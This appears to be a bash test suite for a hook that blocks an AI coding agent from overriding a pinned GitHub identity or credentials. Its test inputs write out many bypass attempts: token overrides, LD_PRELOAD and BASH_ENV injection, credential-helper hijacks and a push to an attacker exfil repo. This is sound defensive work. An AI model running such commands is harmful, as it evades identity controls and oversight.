#!/usr/bin/env bash
# Test harness for identity-guard.sh (deny-only override filter).
# Identity is pinned at the ENVIRONMENT level (settings env GH_TOKEN / GIT_AUTHOR_* /
# GITHUB_PERSONAL_ACCESS_TOKEN) and the git CREDENTIAL HELPER (per-folder gitconfig),
# so clean commands are ALLOWed (the runtime env/gitconfig does the pinning). The hook
# only DENIES attempts to OVERRIDE/STRIP that pinned identity, plus MCP write fail-close.
#   DENY  -> permissionDecision == "deny"
#   ALLOW -> empty stdout (exit 0)
#
# Parameterized: runs entirely against mktemp fixtures + a fixture folders.json + a
# STUBBED gh on PATH. No real paths / handles / tokens / emails appear here.
GUARD="$(cd "$(dirname "$0")/.." && pwd)/identity-guard.sh"

TMP="$(mktemp -d)"; trap 'rm -rf "$TMP"' EXIT
A="$TMP/folder-a"; B="$TMP/folder-b"; OUT="$TMP/elsewhere"; mkdir -p "$A" "$B" "$OUT"
RE="0000000+account-a@users.noreply.github.com"            # fixture "locked email"
cat > "$TMP/folders.json" <<EOF
[ {"path":"$A","account":"account-a","name":"Account A","email":"$RE"},
  {"path":"$B","account":"account-b","name":"Account B","email":"0001+account-b@users.noreply.github.com"} ]
EOF
export IDENTITY_LOCK_CONFIG="$TMP/folders.json"

# Stub gh on PATH so tests never touch the real gh keyring.
mkdir -p "$TMP/bin"
cat > "$TMP/bin/gh" <<'EOF'
#!/usr/bin/env bash
case "$*" in
  "auth token --user account-a") echo "TOKEN_A" ;;
  "auth token --user account-b") echo "TOKEN_B" ;;
  *) exit 0 ;;
esac
EOF
chmod +x "$TMP/bin/gh"; export PATH="$TMP/bin:$PATH"

ROBTOK="TOKEN_A"   # locked token for folder-a (account-a)
OTHER="TOKEN_B"    # a different account's token

pass=0; fail=0; declare -a F

classify() { local o="$1"; [ -z "$o" ] && { echo ALLOW; return; }
  printf '%s' "$o" | jq -e '.hookSpecificOutput.permissionDecision=="deny"' >/dev/null 2>&1 && { echo DENY; return; }
  printf '%s' "$o" | jq -e '.hookSpecificOutput.updatedInput.command' >/dev/null 2>&1 && { echo REWRITE; return; }; echo ALLOW; }
run() { local tool="$1" cmd="$2" cwd="$3" pat="${4-}" pl
  pl=$(jq -n --arg t "$tool" --arg c "$cmd" --arg d "$cwd" '{tool_name:$t,cwd:$d,tool_input:{command:$c}}')
  if [ -n "${4+x}" ]; then printf '%s' "$pl" | GITHUB_PERSONAL_ACCESS_TOKEN="$pat" bash "$GUARD" 2>/dev/null
  else printf '%s' "$pl" | env -u GITHUB_PERSONAL_ACCESS_TOKEN bash "$GUARD" 2>/dev/null; fi; }
ok() { local name="$1" exp="$2" tool="$3" cmd="$4" cwd="$5" pat="${6-}" out got
  if [ -n "${6+x}" ]; then out=$(run "$tool" "$cmd" "$cwd" "$pat"); else out=$(run "$tool" "$cmd" "$cwd"); fi
  got=$(classify "$out")
  if [ "$got" = "$exp" ]; then pass=$((pass+1)); printf '  PASS  %-52s [%s]\n' "$name" "$got"
  else fail=$((fail+1)); printf '  FAIL  %-52s want=%s got=%s\n' "$name" "$exp" "$got"; F+=("$name"); fi; }

# Simulate a properly-pinned rooted session: settings env GH_TOKEN = the folder's locked token.
export GH_TOKEN="$ROBTOK"   # folder-a Bash tests run as if launched from the folder-a root

# rawok: assert with explicit control of the ambient GH_TOKEN (for fail-closed/subdir tests).
rawok() { local name="$1" exp="$2" cmd="$3" cwd="$4" tok="$5" out got pl
  pl=$(jq -n --arg c "$cmd" --arg d "$cwd" '{tool_name:"Bash",cwd:$d,tool_input:{command:$c}}')
  if [ "$tok" = "__unset__" ]; then out=$(printf '%s' "$pl" | env -u GH_TOKEN bash "$GUARD" 2>/dev/null)
  else out=$(printf '%s' "$pl" | GH_TOKEN="$tok" bash "$GUARD" 2>/dev/null); fi
  got=$(classify "$out")
  if [ "$got" = "$exp" ]; then pass=$((pass+1)); printf '  PASS  %-52s [%s]\n' "$name" "$got"
  else fail=$((fail+1)); printf '  FAIL  %-52s want=%s got=%s\n' "$name" "$exp" "$got"; F+=("$name"); fi; }

echo "=== identity-guard (deny-only) test suite ==="

# ---- fail closed when the session is NOT token-pinned (e.g. sub-directory launch) ----
rawok "unpinned subdir: gh pr create -> DENY"     DENY  "gh pr create" "$A/sub" "__unset__"
rawok "unpinned: gh with WRONG GH_TOKEN -> DENY"   DENY  "gh pr create" "$A" "$OTHER"
rawok "wrapper gh unpinned -> DENY"                DENY  "timeout 30 gh pr create" "$A/sub" "__unset__"
rawok "unpinned: gh auth status -> ALLOW"          ALLOW "gh auth status" "$A/sub" "__unset__"
rawok "unpinned: git push -> ALLOW (helper pins)"  ALLOW "git push" "$A/sub" "__unset__"
rawok "pinned: gh pr create (GH_TOKEN=a) -> ALLOW" ALLOW "gh pr create" "$A" "$ROBTOK"

# ---- scoping ----
ok "scope: untracked folder -> ALLOW"   ALLOW Bash "GH_TOKEN=x gh pr create" "$OUT"
ok "scope: /tmp -> ALLOW"               ALLOW Bash "git commit --author=evil" "/tmp"

# ---- clean commands ALLOW (runtime env/gitconfig pins them) ----
ok "plain git push -> ALLOW"            ALLOW Bash "git push" "$A"
ok "plain gh pr create -> ALLOW"        ALLOW Bash "gh pr create -t x" "$A"
ok "git commit -m -> ALLOW"             ALLOW Bash "git commit -m 'x'" "$A"
ok "git status -> ALLOW"                ALLOW Bash "git status" "$A"
ok "git log --author filter -> ALLOW"   ALLOW Bash "git log --author=Bob" "$A"
ok "git config --get -> ALLOW"          ALLOW Bash "git config --get user.email" "$A"
ok "gh auth status -> ALLOW"            ALLOW Bash "gh auth status" "$A"
ok "gh auth switch -u other -> ALLOW(harmless)" ALLOW Bash "gh auth switch -u account-b" "$A"
ok "non-git command -> ALLOW"           ALLOW Bash "ls -la && cat README.md" "$A"
ok "obfuscated git (gi\"\"t) -> ALLOW(env pins)" ALLOW Bash "gi\"\"t push" "$A"
ok "wrapper timeout gh -> ALLOW(env pins)" ALLOW Bash "timeout 30 gh pr create" "$A"

# ---- token overrides DENY (any position/wrapper/quote: var-name can't be split) ----
ok "inline GH_TOKEN= -> DENY"           DENY Bash "GH_TOKEN=gho_EVIL gh pr create" "$A"
ok "env GH_TOKEN= cmd -> DENY"          DENY Bash "env GH_TOKEN=gho_EVIL gh pr create" "$A"
ok "export GH_TOKEN= -> DENY"           DENY Bash "export GH_TOKEN=gho_EVIL ; gh pr merge 1" "$A"
ok "declare GH_TOKEN= -> DENY"          DENY Bash "declare GH_TOKEN=gho_EVIL ; gh pr create" "$A"
ok "GITHUB_TOKEN= -> DENY"              DENY Bash "GITHUB_TOKEN=gho_EVIL gh pr create" "$A"
ok "backtick GH_TOKEN= -> DENY"         DENY Bash "x=\`GH_TOKEN=gho_EVIL gh pr view 1\`" "$A"
ok "comment-injected locked email + token -> DENY" DENY Bash "GH_TOKEN=gho_EVIL gh pr merge 1  # GIT_AUTHOR_EMAIL=\"$RE\"" "$A"
ok "unset GH_TOKEN -> DENY"             DENY Bash "unset GH_TOKEN ; gh pr create" "$A"
ok "env -u GH_TOKEN -> DENY"            DENY Bash "env -u GH_TOKEN gh pr create" "$A"
ok "read GH_TOKEN -> DENY"              DENY Bash "read GH_TOKEN <<< gho_EVIL ; gh pr create" "$A"
ok "printf -v GH_TOKEN -> DENY"         DENY Bash "printf -v GH_TOKEN gho_EVIL ; gh pr create" "$A"

# ---- identity / config overrides DENY ----
ok "GIT_AUTHOR_EMAIL= -> DENY"          DENY Bash "GIT_AUTHOR_EMAIL=evil@x.com git commit -m y" "$A"
ok "env GIT_COMMITTER_EMAIL= -> DENY"   DENY Bash "env GIT_COMMITTER_EMAIL=evil@x git commit -m y" "$A"
ok "git commit --author -> DENY"        DENY Bash "git commit --author=\"E <e@x>\" -m z" "$A"
ok "git -c user.email= -> DENY"         DENY Bash "git -c user.email=e@x commit -m z" "$A"
ok "git -c credential.helper= -> DENY"  DENY Bash "git -c credential.helper=osxkeychain push" "$A"
ok "git config user.email set -> DENY"  DENY Bash "git config user.email evil@x.com" "$A"
ok "GIT_CONFIG_COUNT= inject -> DENY"   DENY Bash "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=user.email GIT_CONFIG_VALUE_0=e@x git commit -m y" "$A"
ok "GIT_SSH_COMMAND= -> DENY"           DENY Bash "GIT_SSH_COMMAND='ssh -i /tmp/evilkey' git push" "$A"

# ---- env-stripping / dynamic-construction / remote ----
ok "eval -> DENY"                       DENY Bash "eval \"gh pr create\"" "$A"
ok "sudo gh -> DENY"                    DENY Bash "sudo gh pr create" "$A"
ok "env -i gh -> DENY"                  DENY Bash "env -i gh pr create" "$A"
ok "ssh host gh -> DENY"                DENY Bash "ssh host gh pr create" "$A"
ok "gh auth logout -> DENY"             DENY Bash "gh auth logout" "$A"

# ---- SSH/scp push & embedded creds ----
ok "git push git@ ssh -> DENY"          DENY Bash "git push git@github.com:foo/bar.git main" "$A"
ok "git push scp host:path -> DENY"     DENY Bash "git push github.com:attacker/exfil.git main" "$A"
ok "git push embedded creds url -> DENY" DENY Bash "git push https://x:tok@github.com/foo/bar main" "$A"
ok "git push https plain -> ALLOW"      ALLOW Bash "git push https://github.com/foo/bar main" "$A"

# ---- name-indirection (literal pinned name appears) ----
ok "export \$v= indirection -> DENY"    DENY Bash "v=GH_TOKEN; export \$v=ATTACKER ; gh pr create" "$A"
ok "env \"\$n\"= indirection -> DENY"   DENY Bash "n=GH_TOKEN; env \"\$n\"=ATTACKER gh pr create" "$A"
ok "printf -v \"\$n\" indirection -> DENY" DENY Bash "n=GH_TOKEN; printf -v \"\$n\" %s ATTACKER ; export \"\$n\"; gh pr create" "$A"
ok "mapfile GH_TOKEN -> DENY"           DENY Bash "mapfile -t GH_TOKEN < tok.txt ; gh pr create" "$A"
ok "GH_TOKEN+= append -> DENY"          DENY Bash "GH_TOKEN+=x ; gh pr create" "$A"
ok "BASH_ENV= startup inject -> DENY"   DENY Bash "BASH_ENV=/tmp/x.sh gh pr create" "$A"
ok "LD_PRELOAD= -> DENY"                DENY Bash "LD_PRELOAD=/tmp/x.so gh pr create" "$A"
ok "read \$GH_TOKEN (read) -> ALLOW"    ALLOW Bash "echo \"len=\${#GH_TOKEN}\"" "$A"
ok "plain \$GH_TOKEN read -> ALLOW"     ALLOW Bash "curl -H \"x: \$GH_TOKEN\" https://x" "$A"
ok "NODE_ENV= (not pinned) -> ALLOW"    ALLOW Bash "NODE_ENV=production npm test" "$A"

# ---- git config writes (credential helper / http / url / askpass) ----
ok "git config credential.helper set -> DENY" DENY Bash "git config credential.https://github.com.helper store" "$A"
ok "git config --global cred helper -> DENY"  DENY Bash "git config --global credential.helper store" "$A"
ok "git config http.extraHeader -> DENY"      DENY Bash "git config --add http.extraHeader 'Authorization: Basic x' && git push" "$A"
ok "git config url.insteadOf -> DENY"         DENY Bash "git config url.git@github.com:.insteadOf https://github.com/" "$A"
ok "git config core.askpass -> DENY"          DENY Bash "git config core.askpass /tmp/evil.sh" "$A"
ok "git config --list (read) -> ALLOW"        ALLOW Bash "git config --list" "$A"

# ---- gh api auth header / hostname / with-token ----
ok "gh api -H Authorization -> DENY"   DENY Bash "gh api -X POST /repos/o/r/issues -H 'Authorization: token OTHER' -f title=x" "$A"
ok "gh api --hostname -> DENY"         DENY Bash "gh api --hostname ghe.example.com /user" "$A"
ok "gh auth login --with-token -> DENY" DENY Bash "gh auth login --with-token < tok.txt" "$A"
ok "gh api plain -> ALLOW"             ALLOW Bash "gh api /user" "$A"
ok "gh api -H Accept (no auth) -> ALLOW" ALLOW Bash "gh api -H 'Accept: application/vnd.github+json' /user" "$A"

# ---- env-strip variants ----
ok "env --ignore-environment -> DENY"  DENY Bash "env --ignore-environment git push" "$A"
ok "env - git push -> DENY"            DENY Bash "env - git push" "$A"

# ---- direct git-config file writes ----
ok "append to .git/config -> DENY"     DENY Bash "printf '[credential]\n' >> .git/config && git push" "$A"
ok "append to per-folder gitconfig -> DENY" DENY Bash "cat >> $TMP/.config/git/account-a.gitconfig <<EOF" "$A"
ok "tee into .gitconfig -> DENY"       DENY Bash "echo x | tee -a ~/.gitconfig" "$A"
ok "cat .git/config (read) -> ALLOW"   ALLOW Bash "cat .git/config" "$A"

# ---- dynamically-named assignment (name-splitting / indirection, no literal name) ----
ok "export \${p}_TOKEN= split-name -> DENY" DENY Bash "p=GH; export \${p}_TOKEN=ATTACKER ; gh pr create" "$A"
ok "export \$v= dynamic -> DENY"        DENY Bash "export \$v=ATTACKER ; gh pr create" "$A"
ok "declare -x \$n= dynamic -> DENY"    DENY Bash "declare -x \$n=ATTACKER ; gh pr create" "$A"
ok "env \$n= dynamic -> DENY"           DENY Bash "env \$n=ATTACKER gh pr create" "$A"
ok "env \"\$n\"= dynamic -> DENY"       DENY Bash "env \"\$n\"=ATTACKER gh pr create" "$A"
ok "printf -v \"\$n\" dynamic -> DENY"  DENY Bash "printf -v \"\$n\" %s ATTACKER" "$A"
ok "read \$n dynamic -> DENY"           DENY Bash "read \$n <<< ATTACKER" "$A"
ok "export PATH=\$PATH (literal) -> ALLOW" ALLOW Bash "export PATH=\$PATH:/usr/local/bin" "$A"
ok "export NODE_ENV= (literal) -> ALLOW"   ALLOW Bash "export NODE_ENV=production" "$A"
ok "env FOO=\$BAR (literal) -> ALLOW"      ALLOW Bash "env FOO=\$BAR npm test" "$A"
ok "export VAR=\$(cmd) (literal) -> ALLOW" ALLOW Bash "export VAR=\$(date +%s)" "$A"
ok "env gh (wrapper) -> ALLOW"             ALLOW Bash "env gh pr create" "$A"

# ---- source / . (external file can set overrides) ----
ok "source file -> DENY"                DENY Bash "source /tmp/x.sh ; gh pr create" "$A"
ok ". file -> DENY"                     DENY Bash ". /tmp/x.sh && gh pr create" "$A"
ok ". ./.env -> DENY"                   DENY Bash ". ./.env" "$A"
ok "./script.sh (exec, not source) -> ALLOW" ALLOW Bash "./build.sh" "$A"
ok "cd . -> ALLOW"                      ALLOW Bash "cd . && ls" "$A"
ok "ls . -> ALLOW"                      ALLOW Bash "ls ." "$A"

# ---- git config file writes via tools (sed -i / cp / mv …) ----
ok "sed -i .git/config -> DENY"         DENY Bash "sed -i 's/x/y/' .git/config" "$A"
ok "cp into per-folder gitconfig -> DENY" DENY Bash "cp /tmp/evil ~/.config/git/account-a.gitconfig" "$A"
ok "mv into .git/config -> DENY"        DENY Bash "mv /tmp/x .git/config" "$A"
ok "sed -i README (not config) -> ALLOW" ALLOW Bash "sed -i 's/x/y/' README.md" "$A"
ok "cat .git/config (read) -> ALLOW"    ALLOW Bash "cat .git/config" "$A"

# ---- config-resolution redirection (HOME/GIT_DIR/--config-env/url.insteadOf) ----
ok "HOME= strips credential helper -> DENY"   DENY Bash "HOME=/tmp git push origin main" "$A"
ok "env HOME= -> DENY"                         DENY Bash "env HOME=/tmp git push" "$A"
ok "XDG_CONFIG_HOME= -> DENY"                   DENY Bash "XDG_CONFIG_HOME=/tmp/x git push origin main" "$A"
ok "GIT_DIR= repo redirect -> DENY"            DENY Bash "GIT_DIR=/tmp/evil/.git git push" "$A"
ok "GIT_WORK_TREE= -> DENY"                     DENY Bash "GIT_WORK_TREE=/tmp git commit -m x" "$A"
ok "git --config-env= -> DENY"                 DENY Bash "HV='x' git --config-env=credential.https://github.com.helper=HV push" "$A"
ok "git -c url.insteadOf -> DENY"              DENY Bash "git -c url.git@github.com:.insteadOf=https://github.com/ push" "$A"
ok "echo \$HOME (read) -> ALLOW"               ALLOW Bash "echo \$HOME/bin" "$A"
ok "cd \$HOME (read) -> ALLOW"                 ALLOW Bash "cd \$HOME && ls" "$A"

# ---- git -c with MIXED-CASE keys (git config keys are case-insensitive) ----
ok "git -c Credential.helper -> DENY"          DENY Bash "git -c Credential.https://github.com.helper='!evil' push" "$A"
ok "git -c Http.extraHeader -> DENY"           DENY Bash "git -c Http.https://github.com/.extraHeader='Authorization: Basic x' push origin main" "$A"
ok "git -c USER.EMAIL -> DENY"                 DENY Bash "git -c USER.EMAIL=evil@x commit -m y" "$A"
ok "git -c Url.insteadOf -> DENY"              DENY Bash "git -c Url.git@github.com:.insteadOf=https://github.com/ push" "$A"
ok "git -c Include.path -> DENY"               DENY Bash "git -c Include.path=/tmp/evil push" "$A"
ok "git -c color.ui (benign) -> ALLOW"         ALLOW Bash "git -c color.ui=always log --oneline" "$A"
ok "redirect to .git/CONFIG (case) -> DENY"    DENY Bash "printf '[x]' >> .git/CONFIG" "$A"

# ---- git -C / --git-dir / --work-tree outside the locked tree ----
ok "git -C /tmp outside-tree -> DENY"          DENY Bash "git -C /tmp/other push origin main" "$A"
ok "git --git-dir outside-tree -> DENY"        DENY Bash "git --git-dir=/tmp/x/.git commit -m y" "$A"
ok "git -C ../escape -> DENY"                  DENY Bash "git -C ../other commit -m y" "$A"
ok "git -C in-tree abs -> ALLOW"               ALLOW Bash "git -C $A/repo status" "$A"
ok "git -C relative subdir -> ALLOW"           ALLOW Bash "git -C subdir status" "$A"
ok "git -C ./sub -> ALLOW"                     ALLOW Bash "git -C ./sub log --oneline" "$A"

# ---- author forge (git am / --reuse-message) ----
ok "git am forged From -> DENY"                DENY Bash "git am 0001-evil.patch" "$A"
ok "format-patch | git am -> DENY"             DENY Bash "git format-patch -1 --stdout HEAD | git am" "$A"
ok "git commit --reuse-message -> DENY"        DENY Bash "git commit --reuse-message=HEAD" "$A"
ok "commit --reuse-message --reset-author -> ALLOW" ALLOW Bash "git commit --reuse-message=HEAD --reset-author" "$A"
ok "git blame (am substring) -> ALLOW"         ALLOW Bash "git blame README.md" "$A"

# ---- per-folder (account-agnostic deny) ----
ok "folder-b GH_TOKEN= -> DENY"         DENY Bash "GH_TOKEN=gho_EVIL gh issue create" "$B"
ok "folder-b git push -> ALLOW"         ALLOW Bash "git push" "$B"
ok "folder-b alt GH_TOKEN= -> DENY"     DENY Bash "GH_TOKEN=gho_EVIL gh pr create" "$B"
ok "folder-b subdir GH_TOKEN= -> DENY"  DENY Bash "GH_TOKEN=gho_EVIL gh pr create" "$B/subrepo"

# ---- MCP write fail-closed / read allow ----
ok "MCP write a token -> ALLOW"     ALLOW mcp__plugin_github_github__create_pull_request "" "$A" "$ROBTOK"
ok "MCP write wrong token -> DENY"  DENY  mcp__plugin_github_github__create_pull_request "" "$A" "$OTHER"
ok "MCP write no token -> DENY"     DENY  mcp__plugin_github_github__push_files "" "$A"
ok "MCP read tool -> ALLOW"         ALLOW mcp__plugin_github_github__get_file_contents "" "$A" "$OTHER"
ok "MCP write outside tree -> ALLOW" ALLOW mcp__plugin_github_github__create_pull_request "" "$OUT" "$OTHER"

echo; echo "=== $pass passed, $fail failed ==="
[ "$fail" -gt 0 ] && { printf '  - %s\n' "${F[@]}"; exit 1; } || exit 0
